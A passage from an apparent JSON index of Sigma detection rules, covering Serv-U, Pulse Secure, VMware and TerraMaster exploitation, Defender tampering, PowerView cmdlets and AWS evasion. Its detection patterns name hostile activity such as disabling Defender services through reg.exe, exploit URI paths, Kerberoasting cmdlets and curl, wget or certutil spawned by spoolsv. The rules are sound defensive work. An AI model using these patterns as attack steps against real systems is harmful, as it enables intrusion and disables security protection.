falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_syncappvpublishingserver_vbs_execute_powershell.yml/","tags":["attack.defense_evasion","attack.t1218","attack.t1216"],"title":"SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code"},{"categories":null,"contents":"Detects a suspicious script executions from temporary folder\nKnown false-positives Administrative scripts References https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/ Raw rule (edit) title: Suspicious Script Execution From Temp Folder id: a6a39bdb-935c-4f0a-ab77-35f4bbf44d33 description: Detects a suspicious script executions from temporary folder status: experimental references: - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/ author: Florian Roth, Max Altgelt date: 2021/07/14 modified: 2021/11/11 tags: - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; CommandLine|contains: - \u0026#39;\\Windows\\Temp\u0026#39; - \u0026#39;\\Temporary Internet\u0026#39; - \u0026#39;\\AppData\\Local\\Temp\u0026#39; - \u0026#39;\\AppData\\Roaming\\Temp\u0026#39; - \u0026#39;%TEMP%\u0026#39; - \u0026#39;%TMP%\u0026#39; - \u0026#39;%LocalAppData%\\Temp\u0026#39; filter: CommandLine|contains: - \u0026#39; \u0026gt;\u0026#39; - \u0026#39;Out-File\u0026#39; - \u0026#39;ConvertTo-Json\u0026#39; - \u0026#39;-WindowStyle hidden -Verb runAs\u0026#39; # VSCode behaviour if file cannot be written as current user condition: selection and not filter falsepositives: - Administrative scripts level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_temp.yml/","tags":["attack.execution","attack.t1059"],"title":"Suspicious Script Execution From Temp Folder"},{"categories":null,"contents":"Detects a suspicious reg.exe invocation that looks as if it would disable an important security service\nKnown false-positives Unknown Other security solution installers References https://twitter.com/JohnLaTwC/status/1415295021041979392 Raw rule (edit) title: Reg Disable Security Service id: 5e95028c-5229-4214-afae-d653d573d0ec description: Detects a suspicious reg.exe invocation that looks as if it would disable an important security service status: experimental references: - https://twitter.com/JohnLaTwC/status/1415295021041979392 author: Florian Roth, John Lambert (idea) date: 2021/07/14 tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection_reg: CommandLine|contains|all: - \u0026#39;reg\u0026#39; - \u0026#39;add\u0026#39; - \u0026#39; /d 4\u0026#39; - \u0026#39; /v Start\u0026#39; selection_services: CommandLine|contains: - \u0026#39;\\Sense \u0026#39; - \u0026#39;\\WinDefend\u0026#39; - \u0026#39;\\MsMpSvc\u0026#39; - \u0026#39;\\NisSrv\u0026#39; - \u0026#39;\\WdBoot \u0026#39; - \u0026#39;\\WdNisDrv\u0026#39; - \u0026#39;\\WdNisSvc\u0026#39; - \u0026#39;\\wscsvc \u0026#39; - \u0026#39;\\SecurityHealthService\u0026#39; - \u0026#39;\\wuauserv\u0026#39; - \u0026#39;\\UsoSvc \u0026#39; condition: selection_reg and selection_services falsepositives: - Unknown - Other security solution installers level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_reg_disable_sec_services.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Reg Disable Security Service"},{"categories":null,"contents":"Detects patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322\nKnown false-positives Unlikely References https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/ Raw rule (edit) title: Serv-U Exploitation CVE-2021-35211 by DEV-0322 id: 75578840-9526-4b2a-9462-af469a45e767 status: experimental description: Detects patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322 author: Florian Roth date: 2021/07/14 references: - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/ logsource: category: process_creation product: windows tags: - attack.persistence - attack.t1136.001 - cve.2021.35211 # - threat_group.DEV-0322 detection: selection1: CommandLine|contains: \u0026#39;whoami\u0026#39; selection2: CommandLine|contains: - \u0026#39;./Client/Common/\u0026#39; - \u0026#39;.\\Client\\Common\\\u0026#39; selection3: CommandLine|contains: \u0026#39;C:\\Windows\\Temp\\Serv-U.bat\u0026#39; condition: selection1 and selection2 or selection3 falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_servu_exploitation_cve_2021_35211.yml/","tags":["attack.persistence","attack.t1136.001","cve.2021.35211"],"title":"Serv-U Exploitation CVE-2021-35211 by DEV-0322"},{"categories":null,"contents":"Detects a suspicious process pattern which could be a sign of an exploited Serv-U service\nKnown false-positives Legitimate uses in which users or programs use the SSH service of Serv-U for remote command execution References https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/ Raw rule (edit) title: Suspicious Serv-U Process Pattern id: 58f4ea09-0fc2-4520-ba18-b85c540b0eaf status: experimental description: Detects a suspicious process pattern which could be a sign of an exploited Serv-U service author: Florian Roth date: 2021/07/14 references: - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/ logsource: category: process_creation product: windows tags: - attack.credential_access - attack.t1555 - cve.2021.35211 detection: selection: ParentImage|endswith: \u0026#39;\\Serv-U.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\sh.exe\u0026#39; - \u0026#39;\\bash.exe\u0026#39; - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/ - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\msiexec.exe\u0026#39; - \u0026#39;\\forfiles.exe\u0026#39; - \u0026#39;\\scriptrunner.exe\u0026#39; condition: selection falsepositives: - Legitimate uses in which users or programs use the SSH service of Serv-U for remote command execution level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_servu_process_pattern.yml/","tags":["attack.credential_access","attack.t1555","cve.2021.35211"],"title":"Suspicious Serv-U Process Pattern"},{"categories":null,"contents":"RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1 Raw rule (edit) title: Abusable Invoke-ATHRemoteFXvGPUDisablementCommand id: 38a7625e-b2cb-485d-b83d-aff137d859f4 status: experimental author: frack113 date: 2021/07/13 modified: 2021/10/16 description: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339). references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md - https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1 tags: - attack.defense_evasion - attack.t1218 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabledd detection: selection_cmd: ContextInfo|contains: \u0026#39;Invoke-ATHRemoteFXvGPUDisablementCommand \u0026#39; selection_opt: ContextInfo|contains: - \u0026#39;-ModuleName \u0026#39; - \u0026#39;-ModulePath \u0026#39; - \u0026#39;-ScriptBlock \u0026#39; - \u0026#39;-RemoteFXvGPUDisablementFilePath\u0026#39; condition: selection_cmd and selection_opt fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_module/posh_pm_susp_athremotefxvgpudisablementcommand.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Abusable Invoke-ATHRemoteFXvGPUDisablementCommand"},{"categories":null,"contents":"Detects the Setting of Windows Defender Exclusions\nKnown false-positives Administrator actions References https://twitter.com/_nullbind/status/1204923340810543109 Raw rule (edit) title: Windows Defender Exclusions Added id: 1321dc4e-a1fe-481d-a016-52c45f0c8b4f description: Detects the Setting of Windows Defender Exclusions date: 2021/07/06 modified: 2022/02/02 author: Christian Burkard references: - https://twitter.com/_nullbind/status/1204923340810543109 status: stable tags: - attack.defense_evasion - attack.t1562.001 logsource: product: windows service: windefend detection: selection1: EventID: 5007 NewValue|contains: \u0026#39;\\Microsoft\\Windows Defender\\Exclusions\u0026#39; condition: selection1 falsepositives: - Administrator actions level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/windefend/win_defender_exclusions.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Windows Defender Exclusions Added"},{"categories":null,"contents":"Emulates attack via documents through protocol handler in Microsoft Office. On successful execution you should see Microsoft Word launch a blank file.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md Raw rule (edit) title: ProtocolHandler.exe Downloaded Suspicious File id: 104cdb48-a7a8-4ca7-a453-32942c6e5dcb status: experimental author: frack113 date: 2021/07/13 description: Emulates attack via documents through protocol handler in Microsoft Office. On successful execution you should see Microsoft Word launch a blank file. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md tags: - attack.defense_evasion - attack.t1218 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\protocolhandler.exe\u0026#39; CommandLine|contains|all: - \u0026#39;\u0026#34;ms-word\u0026#39; - \u0026#39;.docx\u0026#34;\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_protocolhandler_suspicious_file.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"ProtocolHandler.exe Downloaded Suspicious File"},{"categories":null,"contents":"Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.004/T1056.004.md Raw rule (edit) title: Mavinject Inject DLL Into Running Process id: 4f73421b-5a0b-4bbf-a892-5a7fb99bea66 status: experimental author: frack113 date: 2021/07/12 description: Injects arbitrary DLL into running process specified by process ID. Requires Windows 10. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.004/T1056.004.md tags: - attack.defense_evasion - attack.collection - attack.t1218 - attack.t1056.004 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39; /INJECTRUNNING\u0026#39; - \u0026#39;.dll\u0026#39; # space some time in the end OriginalFileName|contains: mavinject condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_creation_mavinject_dll.yml/","tags":["attack.defense_evasion","attack.collection","attack.t1218","attack.t1056.004"],"title":"Mavinject Inject DLL Into Running Process"},{"categories":null,"contents":"Detects suspicious print spool service (spoolsv.exe) child processes.\nKnown false-positives None known References https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md Raw rule (edit) title: Suspicious Spool Service Child Process id: dcdbc940-0bff-46b2-95f3-2d73f848e33b status: stable description: Detects suspicious print spool service (spoolsv.exe) child processes. references: - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md tags: - attack.execution - attack.t1203 - attack.privilege_escalation - attack.t1068 author: Justin C. (@endisphotic), @dreadphones (detection), Thomas Patzke (Sigma rule) date: 2021/07/11 logsource: category: process_creation product: windows detection: spoolsv: ParentImage|endswith: \\\\spoolsv.exe IntegrityLevel: System suspicious_unrestricted: Image|endswith: - \\gpupdate.exe - \\whoami.exe - \\nltest.exe - \\taskkill.exe - \\wmic.exe - \\taskmgr.exe - \\sc.exe - \\findstr.exe - \\curl.exe - \\wget.exe - \\certutil.exe - \\bitsadmin.exe - \\accesschk.exe - \\wevtutil.exe - \\bcdedit.exe - \\fsutil.exe - \\cipher.exe - \\schtasks.exe - \\write.exe - \\wuauclt.exe suspicious_net: Image|endswith: \\net.exe suspicious_net_filter: CommandLine|contains: start suspicious_cmd: Image|endswith: \\cmd.exe suspicious_cmd_filter: CommandLine|contains: - .spl - route add - program files suspicious_netsh: Image|endswith: \\netsh.exe suspicious_netsh_filter: CommandLine|contains: - \u0026#39;add portopening\u0026#39; - \u0026#39;rule name\u0026#39; suspicious_powershell: Image|endswith: \\powershell.exe suspicious_powershell_filter: CommandLine|contains: .spl suspicious_rundll32: Image|endswith: \\rundll32.exe CommandLine|endswith: rundll32.exe condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or suspicious_rundll32 ) fields: - Image - CommandLine falsepositives: - None known level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_spoolsv_child_processes.yml/","tags":["attack.execution","attack.t1203","attack.privilege_escalation","attack.t1068"],"title":"Suspicious Spool Service Child Process"},{"categories":null,"contents":"This rule detects exploitation attempts using Pulse Connect Secure(PCS) vulnerability (CVE-2021-22893)\nKnown false-positives Vulnerability Scanning/Pentesting References https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784 Raw rule (edit) title: Pulse Connect Secure RCE Attack CVE-2021-22893 id: 5525edac-f599-4bfd-b926-3fa69860e766 status: stable description: This rule detects exploitation attempts using Pulse Connect Secure(PCS) vulnerability (CVE-2021-22893) author: Sittikorn S date: 2021/06/29 references: - https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html - https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: c-uri|contains: - \u0026#39;/dana-na/auth/\u0026#39; - \u0026#39;/dana-ws/\u0026#39; - \u0026#39;/dana-cached/\u0026#39; selection2: c-uri|contains: - \u0026#39;?id=\u0026#39; - \u0026#39;?token=\u0026#39; - \u0026#39;Secid_canceltoken.cgi\u0026#39; - \u0026#39;CGI::param\u0026#39; - \u0026#39;meeting\u0026#39; - \u0026#39;smb\u0026#39; - \u0026#39;namedusers\u0026#39; - \u0026#39;metric\u0026#39; condition: selection1 and selection2 falsepositives: - Vulnerability Scanning/Pentesting level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_22893_pulse_secure_rce_exploit.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Pulse Connect Secure RCE Attack CVE-2021-22893"},{"categories":null,"contents":"Identifies disabling of default Amazon Elastic Block Store (EBS) encryption in the current region. Disabling default encryption does not change the encryption status of your existing volumes.\nKnown false-positives System Administrator Activities DEV, UAT, SAT environment. You should apply this rule with PROD account only. References https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DisableEbsEncryptionByDefault.html Raw rule (edit) title: AWS EC2 Disable EBS Encryption id: 16124c2d-e40b-4fcc-8f2c-5ab7870a2223 status: stable description: Identifies disabling of default Amazon Elastic Block Store (EBS) encryption in the current region. Disabling default encryption does not change the encryption status of your existing volumes. author: Sittikorn S date: 2021/06/29 modified: 2021/08/20 references: - https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DisableEbsEncryptionByDefault.html tags: - attack.impact - attack.t1486 - attack.t1565 logsource: product: aws service: cloudtrail detection: selection: eventSource: ec2.amazonaws.com eventName: DisableEbsEncryptionByDefault condition: selection falsepositives: - System Administrator Activities - DEV, UAT, SAT environment. You should apply this rule with PROD account only. level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_ec2_disable_encryption.yml/","tags":["attack.impact","attack.t1486","attack.t1565"],"title":"AWS EC2 Disable EBS Encryption"},{"categories":null,"contents":"Detects the modification of the findings on SecurityHub.\nKnown false-positives System or Network administrator behaviors DEV, UAT, SAT environment. You should apply this rule with PROD environment only. References https://docs.aws.amazon.com/cli/latest/reference/securityhub/ Raw rule (edit) title: AWS SecurityHub Findings Evasion id: a607e1fe-74bf-4440-a3ec-b059b9103157 status: stable description: Detects the modification of the findings on SecurityHub. author: Sittikorn S date: 2021/06/28 references: - https://docs.aws.amazon.com/cli/latest/reference/securityhub/ tags: - attack.defense_evasion - attack.t1562 logsource: product: aws service: cloudtrail detection: selection: eventSource: securityhub.amazonaws.com eventName: - \u0026#39;BatchUpdateFindings\u0026#39; - \u0026#39;DeleteInsight\u0026#39; - \u0026#39;UpdateFindings\u0026#39; - \u0026#39;UpdateInsight\u0026#39; condition: selection fields: - sourceIPAddress - userIdentity.arn falsepositives: - System or Network administrator behaviors - DEV, UAT, SAT environment. You should apply this rule with PROD environment only. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_securityhub_finding_evasion.yml/","tags":["attack.defense_evasion","attack.t1562"],"title":"AWS SecurityHub Findings Evasion"},{"categories":null,"contents":"Detects the presence of default Cobalt Strike certificate in the HTTPS traffic\nKnown false-positives none References https://sergiusechel.medium.com/improving-the-network-based-detection-of-cobalt-strike-c2-servers-in-the-wild-while-reducing-the-6964205f6468 Raw rule (edit) title: Default Cobalt Strike Certificate id: 7100f7e3-92ce-4584-b7b7-01b40d3d4118 description: Detects the presence of default Cobalt Strike certificate in the HTTPS traffic status: experimental author: Bhabesh Raj date: 2021/06/23 modified: 2021/08/24 references: - https://sergiusechel.medium.com/improving-the-network-based-detection-of-cobalt-strike-c2-servers-in-the-wild-while-reducing-the-6964205f6468 tags: - attack.command_and_control - attack.s0154 logsource: product: zeek service: x509 detection: selection: certificate.serial: 8BB00EE condition: selection fields: - san.dns - certificate.subject - certificate.issuer falsepositives: - none level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_default_cobalt_strike_certificate.yml/","tags":["attack.command_and_control","attack.s0154"],"title":"Default Cobalt Strike Certificate"},{"categories":null,"contents":"Detects Commandlet names from PowerView of PowerSploit exploitation framework.\nKnown false-positives Should not be any as administrators do not use this tool References https://powersploit.readthedocs.io/en/stable/Recon/README https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon https://thedfirreport.com/2020/10/08/ryuks-return https://adsecurity.org/?p=2277 Raw rule (edit) title: Malicious PowerView PowerShell Commandlets id: dcd74b95-3f36-4ed9-9598-0490951643aa status: experimental description: Detects Commandlet names from PowerView of PowerSploit exploitation framework. date: 2021/05/18 modified: 2021/10/16 references: - https://powersploit.readthedocs.io/en/stable/Recon/README - https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon - https://thedfirreport.com/2020/10/08/ryuks-return - https://adsecurity.org/?p=2277 tags: - attack.execution - attack.t1059.001 author: Bhabesh Raj logsource: product: windows category: ps_script definition: Script Block Logging must be enable detection: selection: ScriptBlockText|contains: - Export-PowerViewCSV - Get-IPAddress - Resolve-IPAddress - Convert-NameToSid - ConvertTo-SID - Convert-ADName - ConvertFrom-UACValue - Add-RemoteConnection - Remove-RemoteConnection - Invoke-UserImpersonation - Invoke-RevertToSelf - Request-SPNTicket - Get-DomainSPNTicket - Invoke-Kerberoast - Get-PathAcl - Get-DNSZone - Get-DomainDNSZone - Get-DNSRecord - Get-DomainDNSRecord - Get-NetDomain - Get-Domain - Get-NetDomainController - Get-DomainController - Get-NetForest - Get-Forest - Get-NetForestDomain - Get-ForestDomain - Get-NetForestCatalog - Get-ForestGlobalCatalog - Find-DomainObjectPropertyOutlier - Get-NetUser - Get-DomainUser - New-DomainUser - Set-DomainUserPassword - Get-UserEvent - Get-DomainUserEvent - Get-NetComputer - Get-DomainComputer - Get-ADObject - Get-DomainObject - Set-ADObject - Set-DomainObject - Get-ObjectAcl - Get-DomainObjectAcl - Add-ObjectAcl - Add-DomainObjectAcl - Invoke-ACLScanner - Find-InterestingDomainAcl - Get-NetOU - Get-DomainOU - Get-NetSite - Get-DomainSite - Get-NetSubnet - Get-DomainSubnet - Get-DomainSID - Get-NetGroup - Get-DomainGroup - New-DomainGroup - Find-ManagedSecurityGroups - Get-DomainManagedSecurityGroup - Get-NetGroupMember - Get-DomainGroupMember - Add-DomainGroupMember - Get-NetFileServer - Get-DomainFileServer - Get-DFSshare - Get-DomainDFSShare - Get-NetGPO - Get-DomainGPO - Get-NetGPOGroup - Get-DomainGPOLocalGroup - Find-GPOLocation - Get-DomainGPOUserLocalGroupMapping - Find-GPOComputerAdmin - Get-DomainGPOComputerLocalGroupMapping - Get-DomainPolicy - Get-NetLocalGroup - Get-NetLocalGroupMember - Get-NetShare - Get-NetLoggedon - Get-NetSession - Get-LoggedOnLocal - Get-RegLoggedOn - Get-NetRDPSession - Invoke-CheckLocalAdminAccess - Test-AdminAccess - Get-SiteName - Get-NetComputerSiteName - Get-Proxy - Get-WMIRegProxy - Get-LastLoggedOn - Get-WMIRegLastLoggedOn - Get-CachedRDPConnection - Get-WMIRegCachedRDPConnection - Get-RegistryMountedDrive - Get-WMIRegMountedDrive - Get-NetProcess - Get-WMIProcess - Find-InterestingFile - Invoke-UserHunter - Find-DomainUserLocation - Invoke-ProcessHunter - Find-DomainProcess - Invoke-EventHunter - Find-DomainUserEvent - Invoke-ShareFinder - Find-DomainShare - Invoke-FileFinder - Find-InterestingDomainShareFile - Find-LocalAdminAccess - Invoke-EnumerateLocalAdmin - Find-DomainLocalGroupMember - Get-NetDomainTrust - Get-DomainTrust - Get-NetForestTrust - Get-ForestTrust - Find-ForeignUser - Get-DomainForeignUser - Find-ForeignGroup - Get-DomainForeignGroupMember - Invoke-MapDomainTrust - Get-DomainTrustMapping condition: selection falsepositives: - Should not be any as administrators do not use this tool level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_powerview_malicious_commandlets.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Malicious PowerView PowerShell Commandlets"},{"categories":null,"contents":"Detects the modification of Outlook Security Setting to allow unprompted execution. Goes with win_outlook_c2_macro_creation.yml and is particularly interesting if both events occur near to each other.\nKnown false-positives Unlikely References https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ Raw rule (edit) title: Outlook C2 Registry Key id: e3b50fa5-3c3f-444e-937b-0a99d33731cd status: experimental description: Detects the modification of Outlook Security Setting to allow unprompted execution. Goes with win_outlook_c2_macro_creation.yml and is particularly interesting if both events occur near to each other. references: - https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ author: \u0026#39;@ScoubiMtl\u0026#39; tags: - attack.persistence - attack.command_and_control - attack.t1137 - attack.t1008 - attack.t1546 date: 2021/04/05 modified: 2022/01/13 logsource: category: registry_event product: windows detection: selection_registry: EventType: SetValue TargetObject: \u0026#39;HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\u0026#39; Details|contains: \u0026#39;0x00000001\u0026#39; condition: selection_registry falsepositives: - Unlikely level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_outlook_c2_registry_key.yml/","tags":["attack.persistence","attack.command_and_control","attack.t1137","attack.t1008","attack.t1546"],"title":"Outlook C2 Registry Key"},{"categories":null,"contents":"Detects different process creation events as described in Malwarebytes\u0026rsquo;s threat report on Lazarus group activity\nKnown false-positives Should not be any false positives References https://blog.malwarebytes.com/malwarebytes-news/2021/04/lazarus-apt-conceals-malicious-code-within-bmp-file-to-drop-its-rat/ Raw rule (edit) title: Lazarus Activity id: 4a12fa47-c735-4032-a214-6fab5b120670 description: Detects different process creation events as described in Malwarebytes\u0026#39;s threat report on Lazarus group activity status: experimental references: - https://blog.malwarebytes.com/malwarebytes-news/2021/04/lazarus-apt-conceals-malicious-code-within-bmp-file-to-drop-its-rat/ tags: - attack.g0032 - attack.execution - attack.t1106 author: Bhabesh Raj date: 2021/04/20 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39;mshta\u0026#39; - \u0026#39;.zip\u0026#39; selection2: ParentImage: - \u0026#39;C:\\Windows\\System32\\wbem\\wmiprvse.exe\u0026#39; Image: - \u0026#39;C:\\Windows\\System32\\mshta.exe\u0026#39; selection3: ParentImage|contains: - \u0026#39;:\\Users\\Public\\\u0026#39; Image: - \u0026#39;C:\\Windows\\System32\\rundll32.exe\u0026#39; condition: 1 of selection* falsepositives: - Should not be any false positives level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_lazarus_activity_apr21.yml/","tags":["attack.g0032","attack.execution","attack.t1106"],"title":"Lazarus Activity"},{"categories":null,"contents":"Detects the exploitation of the VMware View Planner vulnerability described in CVE-2021-21978\nKnown false-positives None References https://twitter.com/wugeej/status/1369476795255320580 https://paper.seebug.org/1495/ Raw rule (edit) title: CVE-2021-21978 Exploitation Attempt id: 77586a7f-7ea4-4c41-b19c-820140b84ca9 status: test description: Detects the exploitation of the VMware View Planner vulnerability described in CVE-2021-21978 author: Bhabesh Raj references: - https://twitter.com/wugeej/status/1369476795255320580 - https://paper.seebug.org/1495/ date: 2020/03/10 modified: 2021/11/27 logsource: category: webserver detection: selection: cs-method: \u0026#39;POST\u0026#39; c-uri|contains|all: - \u0026#39;logupload\u0026#39; - \u0026#39;logMetaData\u0026#39; - \u0026#39;wsgi_log_upload.py\u0026#39; condition: selection fields: - c-ip - c-dns falsepositives: - None level: high tags: - attack.initial_access - attack.t1190 - cve.2021.21978 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_21978_vmware_view_planner_exploit.yml/","tags":["attack.initial_access","attack.t1190","cve.2021.21978"],"title":"CVE-2021-21978 Exploitation Attempt"},{"categories":null,"contents":"Detects the exploitation of VSphere Remote Code Execution vulnerability as described in CVE-2021-21972\nKnown false-positives OVA uploads to your VSphere appliance References https://www.vmware.com/security/advisories/VMSA-2021-0002.html https://f5.pm/go-59627.html https://swarm.ptsecurity.com/unauth-rce-vmware Raw rule (edit) title: CVE-2021-21972 VSphere Exploitation id: 179ed852-0f9b-4009-93a7-68475910fd86 status: experimental description: Detects the exploitation of VSphere Remote Code Execution vulnerability as described in CVE-2021-21972 author: Bhabesh Raj date: 2021/02/24 modified: 2021/08/09 references: - https://www.vmware.com/security/advisories/VMSA-2021-0002.html - https://f5.pm/go-59627.html - https://swarm.ptsecurity.com/unauth-rce-vmware logsource: category: webserver detection: selection: cs-method: \u0026#39;POST\u0026#39; c-uri: \u0026#39;/ui/vropspluginui/rest/services/uploadova\u0026#39; condition: selection fields: - c-ip - c-dns falsepositives: - OVA uploads to your VSphere appliance level: high tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_vsphere_cve_2021_21972_unauth_rce_exploit.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2021-21972 VSphere Exploitation"},{"categories":null,"contents":"Detects the exploitation of the TerraMaster TOS vulnerability described in CVE-2020-28188\nKnown false-positives Unknown References https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/ https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/ Raw rule (edit) title: TerraMaster TOS CVE-2020-28188 id: 15c312b9-00d0-4feb-8870-7d940a4bdc5e status: experimental description: Detects the exploitation of the TerraMaster TOS vulnerability described in CVE-2020-28188 author: Bhabesh Raj date: 2021/01/25 references: - https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/ - https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/ logsource: category: webserver detection: base_url: cs-method: \u0026#39;GET\u0026#39; c-uri|contains|all: - \u0026#39;/include/makecvs.php\u0026#39; - \u0026#39;?Event=\u0026#39; payload: c-uri|contains: - \u0026#39;curl\u0026#39; - \u0026#39;wget\u0026#39; - \u0026#39;.py\u0026#39; - \u0026#39;.sh\u0026#39; - \u0026#39;chmod\u0026#39; - \u0026#39;_GET\u0026#39; condition: base_url and payload fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.t1190 - attack.initial_access - cve.2020.28188 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_terramaster_cve_2020_28188_rce_exploit.yml/","tags":["attack.t1190","attack.initial_access","cve.2020.28188"],"title":"TerraMaster TOS CVE-2020-28188"},{"categories":null,"contents":"Detects the exploitation of the WebLogic server vulnerability described in 